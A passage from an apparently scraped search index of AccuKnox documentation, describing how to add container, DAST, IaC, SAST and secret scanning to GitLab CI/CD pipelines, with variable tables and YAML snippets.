AccuKnox. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Configure GitLab CI/CD Variables. For details on configuring variables, refer to How to Create CI/CD Variables in GitLab.</p> Name Description <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to (e.g., <code>cspm.demo.accuknox.com</code>) <code>ACCUKNOX_TENANT_ID</code> The ID of the tenant associated with the CSPM panel <code>ACCUKNOX_TOKEN</code> Token for authenticating with the AccuKnox CSPM panel <code>ACCUKNOX_LABEL</code> Label to categorize or tag the scan results <p>The label used to categorize and identify scan results in AccuKnox. Create a new label if it is not available</p>"},{"location":"integrations/gitlab-container-scan/#step-3-define-the-gitlab-cicd-pipeline-configuration","title":"Step 3: Define the GitLab CI/CD Pipeline Configuration","text":"<p>Create or modify your <code>.gitlab-ci.yml</code> file to integrate AccuKnox scanning into your build pipeline:</p> <pre><code>variables:\n  IMAGE: \"gitlabci\"\n  IMAGE_TAG: \"test7\"\n  IMAGE_TAR: \"image.tar\"\n\nbuild_image:\n  stage: build\n  image: docker:20.10.16\n  services:\n    - docker:20.10.16-dind\n  script:\n    - docker build -t $IMAGE:$IMAGE_TAG -f Dockerfile .\n    - docker save -o $IMAGE_TAR $IMAGE:$IMAGE_TAG\n  artifacts:\n    paths:\n      - $IMAGE_TAR\n    expire_in: 30 minutes\n\naccuknox-container-scan:\n  before_script:\n    - echo $IMAGE:$IMAGE_TAG\n    - docker load -i $IMAGE_TAR\n\ninclude:\n  - component: $CI_SERVER_FQDN/accu-knox/scan/container-scan@2.0.0\n    inputs:\n      STAGE: test\n      IMAGE_NAME: $IMAGE\n      TAG: $IMAGE_TAG\n      SOFT_FAIL: true\n      ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n      ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n      ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n      ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/gitlab-container-scan/#inputs-for-accuknox-container-scanning","title":"Inputs for AccuKnox Container Scanning","text":"Name Description Required Default <code>ACCUKNOX_ENDPOINT</code> AccuKnox CSPM panel URL Yes <code>cspm.demo.accuknox.com</code> <code>ACCUKNOX_TENANT_ID</code> AccuKnox Tenant ID Yes <code>ACCUKNOX_TOKEN</code> AccuKnox API Token Yes <code>ACCUKNOX_LABEL</code> Label for scan results Yes <code>INPUT_SOFT_FAIL</code> Continue even if the scan fails No <code>true</code> <code>IMAGE_NAME</code> The name of the Docker image Yes <code>TAG</code> The tag for the Docker image No <code>$BITBUCKET_BUILD_NUMBER</code> <code>SEVERITY</code> Comma-separated list of vulnerability severities that will trigger failure when <code>INPUT_SOFT_FAIL</code> is disabled No <code>UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL</code>"},{"location":"integrations/gitlab-container-scan/#workflow-enhancements-after-accuknox-integration","title":"Workflow Enhancements After AccuKnox Integration:","text":"<ol> <li> <p>Build and Scan: Docker images are built and automatically scanned for vulnerabilities during the pipeline execution.</p> </li> <li> <p>Critical Vulnerabilities Halt Deployment: If critical vulnerabilities are detected, the pipeline fails, preventing the deployment of insecure images.</p> </li> <li> <p>Improved Security Posture: Only images free from known vulnerabilities are deployed, reducing the risk in production environments.</p> </li> </ol>"},{"location":"integrations/gitlab-container-scan/#outcome","title":"Outcome","text":"<ul> <li> <p>Vulnerabilities are detected and addressed early in the CI/CD pipeline, ensuring that only secure Docker images are pushed to production.</p> </li> <li> <p>Developers receive immediate feedback on image security, allowing for quicker remediation of issues.   </p> </li> </ul>"},{"location":"integrations/gitlab-container-scan/#view-scan-results-in-accuknox-saas","title":"View Scan Results in AccuKnox SaaS","text":"<p>After the scan completes, the results can be accessed in AccuKnox SaaS:</p> <ol> <li> <p>Go to Issues \u2192 RegistryScan in AccuKnox to view your scanned Docker images.     </p> </li> <li> <p>Click on the image name to access detailed metadata and scan results.     </p> </li> <li> <p>Under the Findings section, you'll see a list of vulnerabilities discovered in the Docker image.     </p> </li> <li> <p>In the Resources section, you'll find details about the packages and modules used to build the container.     </p> </li> <li> <p>You can also view the scan history to track improvements over time.     </p> </li> </ol>"},{"location":"integrations/gitlab-container-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox into GitLab CI/CD pipelines enhances the security of Docker images by scanning for vulnerabilities early in the development process. This proactive approach ensures that only secure images are deployed, reducing the risk of security breaches in production environments.</p>"},{"location":"integrations/gitlab-container-variables/","title":"Container Scanning Variables","text":"<p>The container scanning section of the GitLab CI/CD pipeline is designed to integrate with AccuKnox to scan Docker images for security vulnerabilities.</p> <p>Here\u2019s the table that outlines the inputs and their descriptions, along with default values:</p> Input Value Description Default Value STAGE Specifies the pipeline stage. test DOCKERFILE_CONTEXT The context of the Dockerfile to use for building the image. Dockerfile REPOSITORY_NAME The name of the Docker image repository. N/A (Required) TAG The tag for the Docker image. \"$CI_JOB_ID\" SEVERITY Allows selection of severity level for the scan. Options include UNKNOWN, LOW, MEDIUM, HIGH, CRITICAL. UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL INPUT_SOFT_FAIL Do not return an error code if there are failed checks. true ACCUKNOX_TOKEN The token for authenticating with the CSPM panel. N/A (Required) ACCUKNOX_TENANT The ID of the tenant associated with the CSPM panel. N/A (Required) ACCUKNOX_ENDPOINT The URL of the CSPM panel to push the scan results to. cspm.demo.accuknox.com ACCUKNOX_LABEL The label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/gitlab-dast-variables/","title":"GitLab DAST Variables","text":"<p>The Dynamic Application Security Testing (DAST) scanning section of the GitLab CI/CD pipeline integrates with AccuKnox for scanning live web applications for security vulnerabilities.</p> <p>Here\u2019s the table that outlines the inputs and their descriptions, along with default values:</p> Input Description Default Value STAGE Specifies the pipeline stage. test TARGET_URL The URL of the web application to scan. N/A (Required) SEVERITY_THRESHOLD The minimum severity level (e.g., High, Medium, Low, Informational) that will cause the pipeline to fail if present in the report. High DAST_SCAN_TYPE Type of ZAP scan to run: 'baseline' or 'full-scan'. baseline INPUT_SOFT_FAIL Do not return an error code if there are failed checks. true (boolean) ACCUKNOX_TOKEN The token for authenticating with the CSPM panel. N/A (Required) ACCUKNOX_TENANT ID of the tenant associated with the CSPM Panel panel. N/A (Required) ACCUKNOX_ENDPOINT URL of the CSPM panel to push the scan results to. cspm.demo.accuknox.com ACCUKNOX_LABEL Label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/gitlab-dast/","title":"Gitlab DAST","text":"<p>To demonstrate the benefits of incorporating AccuKnox into a CI/CD pipeline using GitLab to enhance security, consider a specific scenario involving a domain with known vulnerabilities. By integrating AccuKnox scanning into the pipeline, we can identify and resolve these security issues.</p> <p></p>"},{"location":"integrations/gitlab-dast/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>GitLab Access</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul>"},{"location":"integrations/gitlab-dast/#steps-for-integration","title":"Steps for Integration","text":"<p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Configure GitLab CI/CD Variables. For details on configuring variables, refer to How to Create CI/CD Variables in GitLab.</p> <ol> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ol> <p>Step 3: Set Up GitLab CI/CD Pipeline</p> <p>Create a new pipeline in your GitLab project with the following YAML configuration:</p> <pre><code>include:\n  - component: $CI_SERVER_FQDN/accu-knox/scan/dast-scan@2.0.0\n    inputs:\n      STAGE: test\n      TARGET_URL: \"https://juice-shop.herokuapp.com/\"\n      SEVERITY_THRESHOLD: \"High\"\n      DAST_SCAN_TYPE: \"baseline\"\n      SOFT_FAIL: false\n      ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n      ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n      ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n      ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/gitlab-dast/#initial-cicd-pipeline-without-accuknox-scan","title":"Initial CI/CD Pipeline Without AccuKnox Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox scan. When you push changes to the repository, no security checks are performed, potentially allowing security issues in the application.</p>"},{"location":"integrations/gitlab-dast/#cicd-pipeline-after-accuknox-scan-integration","title":"CI/CD Pipeline After AccuKnox Scan Integration","text":"<p>After integrating AccuKnox into your CI/CD pipeline, the next push triggers the CI/CD pipeline. The AccuKnox scan identifies potential vulnerabilities in the application.</p> <p></p>"},{"location":"integrations/gitlab-dast/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select DAST Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details.</p> <p></p> <p>Step 4: Fix the Vulnerability</p> <p>Follow the instructions in the Solutions tab to fix the vulnerability</p> <p></p> <p>Step 5: Create a Ticket for Fixing the Vulnerability</p> <p>Create a ticket in your issue-tracking system to address the identified vulnerability.</p> <p></p> <p>Step 6: Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the GitLab CI/CD pipeline.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"integrations/gitlab-dast/#conclusion","title":"Conclusion","text":"<p>GitLab CI/CD, combined with AccuKnox scanning, provides enhanced security by identifying and mitigating vulnerabilities during the CI/CD process. This integration offers visibility into potential security issues and helps ensure a secure deployment environment. AccuKnox DAST integrates seamlessly with various CI/CD tools, including Jenkins, GitHub, GitLab, Azure Pipelines, and AWS CodePipelines.</p>"},{"location":"integrations/gitlab-iac-scan/","title":"GitLab IaC Scan via Accuknox","text":"<p>This guide demonstrates how to secure a CI/CD pipeline in GitLab using Accuknox to enhance security for Infrastructure as Code (IaC). We will identify code vulnerabilities and send the results to AccuKnox for analysis and remediation.</p>"},{"location":"integrations/gitlab-iac-scan/#prerequisites","title":"Prerequisites","text":"<ol> <li> <p>Public Repository:</p> <ul> <li>You only need the repository URL containing the IaC files.</li> </ul> </li> <li> <p>Private Repository:</p> <ul> <li> <p>Go to your GitLab repository Navigate to <code>Settings &gt; Access Tokens</code> to get the token. </p> </li> <li> <p>Add a new token with <code>read_repository</code> as the scope and assign the role as <code>Reporter</code>. </p> </li> </ul> </li> </ol>"},{"location":"integrations/gitlab-iac-scan/#configuring-code-source-in-accuknox","title":"Configuring Code Source in Accuknox","text":"<ol> <li> <p>Go to <code>Settings &gt; Integration &gt; Code Source Configuration</code> on the Accuknox platform. </p> </li> <li> <p>Enter the repository path:</p> <ul> <li> <p>Public Repository: No token is needed.</p> </li> <li> <p>Private Repository: Enter the previously created access token.</p> </li> </ul> </li> <li> <p>Click on <code>Test</code> to verify the configuration and ensure there are no errors.</p> </li> <li> <p>Select the branch type and label.</p> </li> <li> <p>Save the configuration.</p> </li> </ol> <p></p>"},{"location":"integrations/gitlab-iac-scan/#setting-up-iac-configuration","title":"Setting Up IaC Configuration","text":"<ol> <li> <p>Navigate to the <code>IaC Configuration</code> tab.</p> </li> <li> <p>Click on <code>Add Configuration</code>.</p> </li> </ol> <p></p> <ol> <li> <p>Fill in the following details:</p> <ul> <li> <p>Integration Name: Provide a name for this integration.</p> </li> <li> <p>Framework Type: Select the file types you want to scan in the repository (e.g., Terraform, Helm, Dockerfile).</p> </li> </ul> </li> <li> <p>Select the repository from the dropdown menu that you previously added.</p> </li> </ol> <p></p> <ol> <li> <p>Under the conditions which is an Optional field, you can include or exclude specific files from the scan.</p> </li> <li> <p>Save the configuration.</p> </li> </ol> <p></p>"},{"location":"integrations/gitlab-iac-scan/#viewing-and-managing-iac-findings-on-accuknox","title":"Viewing and Managing IaC Findings on Accuknox","text":"<ol> <li> <p>On the Accuknox platform, navigate to <code>Issues &gt; Findings</code>.</p> </li> <li> <p>Select the findings type as <code>IaC Findings</code>.</p> </li> <li> <p>Add the appropriate labels to filter and view the specific IaC findings.</p> </li> </ol> <p></p>"},{"location":"integrations/gitlab-iac-variables/","title":"GitLab IaC Variables","text":"<p>The Infrastructure as Code (IaC) scanning section of the GitLab CI/CD pipeline is designed to integrate with AccuKnox to scan infrastructure code files (e.g., Terraform) for security vulnerabilities.</p> <p>Here\u2019s the table that outlines the inputs and their descriptions, along with default values:</p> Input Value Description Default Value STAGE Specifies the pipeline stage. test INPUT_FILE Specify a file for scanning (e.g., \".tf\" for Terraform). Cannot be used with directory input. \"\" (empty, optional) INPUT_DIRECTORY Directory with infrastructure code and/or package manager files to scan. \".\" (current directory) INPUT_COMPACT Do not display code blocks in the output. true (boolean) INPUT_QUIET Display only failed checks. true (boolean) INPUT_SOFT_FAIL Do not return an error code if there are failed checks. true (boolean) INPUT_FRAMEWORK Run only on a specific infrastructure (Kubernetes or Terraform). \"\" (empty, optional) ACCUKNOX_TOKEN The token for authenticating with the CSPM panel. N/A (Required) ACCUKNOX_TENANT ID of the tenant associated with the CSPM panel. N/A (Required) ACCUKNOX_ENDPOINT URL of the CSPM panel to push the scan results to. cspm.demo.accuknox.com ACCUKNOX_LABEL Label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/gitlab-opengrep/","title":"Integrating SAST with AccuKnox in a GitLab CI/CD Pipeline","text":"<p>This guide demonstrates how to integrate SAST scanning into a GitLab CI/CD pipeline and forward the results to AccuKnox for security analysis and remediation.</p>"},{"location":"integrations/gitlab-opengrep/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>GitLab repository with CI/CD enabled</p> </li> <li> <p>AccuKnox SaaS account</p> </li> </ul>"},{"location":"integrations/gitlab-opengrep/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/gitlab-opengrep/#step-1-generate-accuknox-api-token","title":"Step 1: Generate AccuKnox API Token","text":"<p>Log in to AccuKnox, navigate to Settings &gt; Tokens, and create an API token for forwarding scan results. For detailed instructions, refer to the documentation on Creating Tokens.</p>"},{"location":"integrations/gitlab-opengrep/#step-2-configure-gitlab-cicd-variables","title":"Step 2: Configure GitLab CI/CD Variables","text":"<p>Define the following environment variables in GitLab under Settings &gt; CI/CD &gt; Variables, refer to How to Create CI/CD Variables in GitLab.</p> <ul> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ul>"},{"location":"integrations/gitlab-opengrep/#inputs-for-accuknox-sast-action","title":"Inputs for AccuKnox SAST Action","text":"Parameter Description Default Value <code>STAGE</code> Specifies the pipeline stage. <code>test</code> <code>SOFT_FAIL</code> Do not return an error code if vulnerabilities are found. <code>true</code> <code>UPLOAD_ARTIFACT</code> Uploads scan results to AccuKnox CSPM. <code>true</code> <code>ACCUKNOX_TOKEN</code> Token for authenticating with the CSPM panel. N/A (Required) <code>ACCUKNOX_TENANT</code> The ID of the tenant associated with the CSPM panel. N/A (Required) <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. <code>cspm.demo.accuknox.com</code> <code>ACCUKNOX_LABEL</code> Label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/gitlab-opengrep/#step-3-define-gitlab-cicd-pipeline","title":"Step 3: Define GitLab CI/CD Pipeline","text":"<p>Create a new pipeline configuration in <code>.gitlab-ci.yml</code> with the following setup:</p> <pre><code>include:\n  - component: $CI_SERVER_FQDN/accu-knox/scan/sast-scan@2.0.0\n    inputs:\n      STAGE: test\n      SOFT_FAIL: false\n      ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n      ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n      ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n      ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/gitlab-opengrep/#pipeline-execution","title":"Pipeline Execution","text":""},{"location":"integrations/gitlab-opengrep/#before-accuknox-integration","title":"Before AccuKnox Integration","text":"<p>Initially, there are no security checks in place, and even if Opengrep is integrated, vulnerabilities might go unnoticed as they must be reviewed manually within the pipeline.</p>"},{"location":"integrations/gitlab-opengrep/#after-accuknox-integration","title":"After AccuKnox Integration","text":"<p>With AccuKnox integrated, scan results are automatically forwarded for risk assessment and remediation.</p> <p></p>"},{"location":"integrations/gitlab-opengrep/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<ol> <li> <p>Log in to AccuKnox SaaS.</p> </li> <li> <p>Navigate to Issues &gt; Findings &gt; Opengrep Findings. </p> </li> <li> <p>Select a vulnerability to inspect details. </p> </li> <li> <p>Apply fixes based on recommendations in the Solutions tab. </p> </li> <li> <p>Generate an issue ticket for tracking the fix. </p> </li> <li> <p>Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the workflow.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul> </li> </ol>"},{"location":"integrations/gitlab-opengrep/#conclusion","title":"Conclusion","text":"<p>Integrating SAST with AccuKnox in GitLab CI/CD enhances security by automating vulnerability detection and remediation. This setup ensures centralized monitoring, early detection, and actionable insights, strengthening code quality and security throughout the development lifecycle.</p>"},{"location":"integrations/gitlab-overview/","title":"Gitlab Integrations","text":""},{"location":"integrations/gitlab-overview/#gitlab-integrations","title":"Gitlab Integrations","text":"<p>SAST (Static Analysis)</p> <p>SAST (OpenGrep)</p> <p>Container Scan</p> <p>IaC Scan</p> <p>IaC Scan (Gitlab Pipeline)</p> <p>DAST (Dynamic Analysis)</p> <p>Secrets Scan (Gitlab Pipeline)</p>"},{"location":"integrations/gitlab-overview/#scan-variables","title":"Scan Variables","text":"<p>Container Variables</p> <p>IaC Variables</p> <p>DAST (Dynamic Analysis)</p> <p>SAST Variables</p> <p></p>"},{"location":"integrations/gitlab-pipeline-iac-scan/","title":"GitLab Pipeline IaC Scan","text":"<p>This guide demonstrates how to integrate Infrastructure as Code (IaC) security into a GitLab CI/CD pipeline using AccuKnox. We will implement automated checks to identify configuration vulnerabilities in your IaC templates and send the results to AccuKnox for thorough analysis and remediation. This approach ensures your infrastructure is resilient and aligns with security best practices, effectively minimizing deployment risks.</p>"},{"location":"integrations/gitlab-pipeline-iac-scan/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>GitLab Access</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul>"},{"location":"integrations/gitlab-pipeline-iac-scan/#steps-for-integration","title":"Steps for Integration","text":"<p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Configure GitLab CI/CD Variables. For details on configuring variables, refer to How to Create CI/CD Variables in GitLab.</p> <ol> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ol> <p>Step 3: Set Up GitLab CI/CD Pipeline</p> <p>Create a new pipeline in your GitLab project with the following YAML configuration:</p> <pre><code>include:\n  - component: $CI_SERVER_FQDN/accu-knox/scan/iac-scan@1.0\n    inputs:\n      STAGE: test\n      INPUT_DIRECTORY: \".\"\n      INPUT_COMPACT: true\n      INPUT_QUIET: true\n      INPUT_SOFT_FAIL: false\n      ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n      ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n      ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n      ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/gitlab-pipeline-iac-scan/#initial-cicd-pipeline-without-accuknox-iac-scan","title":"Initial CI/CD Pipeline Without AccuKnox IaC Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox IaC scan. When changes are pushed to the repository, no infrastructure security checks are performed, potentially allowing misconfigurations or vulnerabilities in the IaC code.</p>"},{"location":"integrations/gitlab-pipeline-iac-scan/#cicd-pipeline-after-accuknox-iac-scan-integration","title":"CI/CD Pipeline After AccuKnox IaC Scan Integration","text":"<p>Once the AccuKnox IaC scan is integrated into the CI/CD pipeline, every push triggers an IaC security scan. This scan identifies potential security vulnerabilities or misconfigurations in the infrastructure code, enhancing security before deployment. The findings are then sent to the AccuKnox platform.</p> <p></p>"},{"location":"integrations/gitlab-pipeline-iac-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the pipeline completes, navigate to the Accuknox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select IaC Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details and follow the instructions in the Solutions tab.</p> <p></p> <p>Step 4: For unresolved vulnerabilities, create a ticket in your issue tracking system.</p> <p></p> <p>Step 5: After fixing the vulnerabilities, rerun the GitLab CI/CD pipeline and verify that the issues have been resolved in the AccuKnox dashboard.</p>"},{"location":"integrations/gitlab-pipeline-iac-scan/#conclusion","title":"Conclusion","text":"<p>By integrating Checkov for IaC scanning with AccuKnox in a GitLab CI/CD pipeline, you strengthen the security of your infrastructure code. This integration allows for early detection and remediation of misconfigurations and vulnerabilities in the development lifecycle, ensuring a more secure deployment environment.</p>"},{"location":"integrations/gitlab-sast-variables/","title":"GitLab SAST Variables","text":"<p>The Static Application Security Testing (SAST) scanning section of the GitLab CI/CD pipeline integrates with SonarQube for analyzing code quality and security vulnerabilities. The scan results are then pushed to the AccuKnox platform for further analysis and tracking.</p> Input Description Default Value STAGE Specifies the pipeline stage. test SONAR_TOKEN Token for authenticating with SonarQube. N/A (Required) SONAR_HOST_URL The SonarQube host URL. N/A (Required) SONAR_PROJECT_KEY The project key in SonarQube. N/A (Required) ACCUKNOX_TOKEN Token for authenticating with the CSPM panel. N/A (Required) ACCUKNOX_TENANT The ID of the tenant associated with the CSPM panel. N/A (Required) ACCUKNOX_ENDPOINT The URL of the CSPM panel to push the scan results to. cspm.demo.accuknox.com ACCUKNOX_LABEL Label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/gitlab-sast/","title":"Integrating SonarQube SAST with AccuKnox in a GitLab CI/CD Pipeline","text":"<p>This guide demonstrates how to incorporate AccuKnox into a CI/CD pipeline using GitLab to enhance security. We'll use SonarQube SAST scanning to identify code vulnerabilities and send the results to AccuKnox for further analysis and remediation.</p>"},{"location":"integrations/gitlab-sast/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>GitLab Access</p> </li> <li> <p>AccuKnox Platform Access</p> </li> <li> <p>SonarQube Access</p> </li> </ul>"},{"location":"integrations/gitlab-sast/#steps-for-integration","title":"Steps for Integration","text":"<p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Configure GitLab CI/CD Variables. For details on configuring variables, refer to How to Create CI/CD Variables in GitLab. 1. ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> <ol> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> <li> <p>SONAR_TOKEN: Your SonarQube API token.</p> </li> <li> <p>SONAR_HOST_URL: The URL of your SonarQube server.</p> </li> <li> <p>SONAR_PROJECT_KEY: The project key for your SonarQube project.</p> </li> </ol>"},{"location":"integrations/gitlab-sast/#configuration-parameters","title":"Configuration Parameters","text":"Parameter Description Default Value <code>STAGE</code> Specifies the pipeline stage. <code>test</code> <code>SONAR_TOKEN</code> Token for authenticating with SonarQube. N/A (Required) <code>SONAR_HOST_URL</code> The SonarQube host URL. N/A (Required) <code>SONAR_PROJECT_KEY</code> The project key in SonarQube. N/A (Required) <code>ACCUKNOX_TOKEN</code> Token for authenticating with the CSPM panel. N/A (Required) <code>ACCUKNOX_TENANT</code> The ID of the tenant associated with the CSPM panel. N/A (Required) <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. <code>cspm.demo.accuknox.com</code> <code>ACCUKNOX_LABEL</code> Label created in AccuKnox SaaS for associating scan results. N/A (Required) <code>SOFT_FAIL</code> Do not return an error code if there are failed checks. <code>true</code> (boolean) <code>SKIP_SONAR_SCAN</code> If <code>true</code>, skips the SonarQube scan entirely. <code>false</code> (boolean) <p>Step 3: Set Up GitLab CI/CD Pipeline</p> <p>Create a new pipeline in your GitLab project with the following YAML configuration:</p> <pre><code>include:\n  - component: $CI_SERVER_FQDN/accu-knox/scan/sq-sast-scan@2.0.0\n    inputs:\n      STAGE: test\n      SONAR_TOKEN: ${SONAR_TOKEN}\n      SONAR_HOST_URL: ${SONAR_HOST_URL}\n      SONAR_PROJECT_KEY: ${SONAR_PROJECT_KEY}\n      ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n      ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n      ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n      ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/gitlab-sast/#initial-cicd-pipeline-without-accuknox-scan","title":"Initial CI/CD Pipeline Without AccuKnox Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox scan. Vulnerabilities in the code could go unnoticed without security checks.</p>"},{"location":"integrations/gitlab-sast/#cicd-pipeline-after-accuknox-integration","title":"CI/CD Pipeline After AccuKnox Integration","text":"<p>After integrating AccuKnox into the pipeline, pushing changes triggers the SonarQube scan, and results are sent to AccuKnox. AccuKnox helps identify potential code vulnerabilities.</p> <p></p> <p></p>"},{"location":"integrations/gitlab-sast/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select SAST Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details.</p> <p></p> <p>Step 4: Fix the Vulnerability</p> <p>Follow the instructions in the Solutions tab to fix the vulnerability</p> <p></p> <p>Step 5: Create a Ticket for Fixing the Vulnerability</p> <p>Create a ticket in your issue-tracking system to address the identified vulnerability.</p> <p></p> <p>Step 6: Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the GitLab CI/CD pipeline.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"integrations/gitlab-sast/#conclusion","title":"Conclusion","text":"<p>By integrating SonarQube SAST with AccuKnox in a GitLab CI/CD pipeline, you enhance the security of your codebase. This integration helps detect and address potential vulnerabilities early in the development lifecycle, ensuring a secure deployment environment.</p>"},{"location":"integrations/gitlab-secret-scan/","title":"Gitlab Secret Scan","text":"<p>This guide walks you through integrating AccuKnox Secret Scanning into your GitLab CI/CD pipeline to improve code security. The integration helps identify hard-coded secrets and sensitive data in your repositories, with scan results uploaded to the AccuKnox SaaS platform for analysis and remediation.</p>"},{"location":"integrations/gitlab-secret-scan/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>GitLab Access</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul>"},{"location":"integrations/gitlab-secret-scan/#steps-for-integration","title":"Steps for Integration","text":"<p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Configure GitLab CI/CD Variables. For details on configuring variables, refer to How to Create CI/CD Variables in GitLab.</p> <ol> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ol> <p>Step 3: Set Up GitLab CI/CD Pipeline</p> Input Value Description Default Value <code>STAGE</code> Specifies the pipeline stage. <code>test</code> <code>RESULTS</code> Specifies which type(s) of results to output: <code>verified</code>, <code>unknown</code>, <code>unverified</code>, <code>filtered_unverified</code>. Defaults to all types. <code>\"\"</code> <code>BRANCH</code> The branch to scan. Use <code>all-branches</code> to scan all branches. <code>\"\"</code> <code>EXCLUDE_PATHS</code> Paths to exclude from the scan. <code>\"\"</code> <code>ADDITIONAL_ARGUMENTS</code> Extra parameters for secret scanning. <code>\"\"</code> <code>SOFT_FAIL</code> Do not return an error code if secrets are found. <code>true</code> <code>ACCUKNOX_TOKEN</code> The token for authenticating with the CSPM panel. <code>N/A (Required)</code> <code>ACCUKNOX_TENANT</code> The ID of the tenant associated with the CSPM panel. <code>N/A (Required)</code> 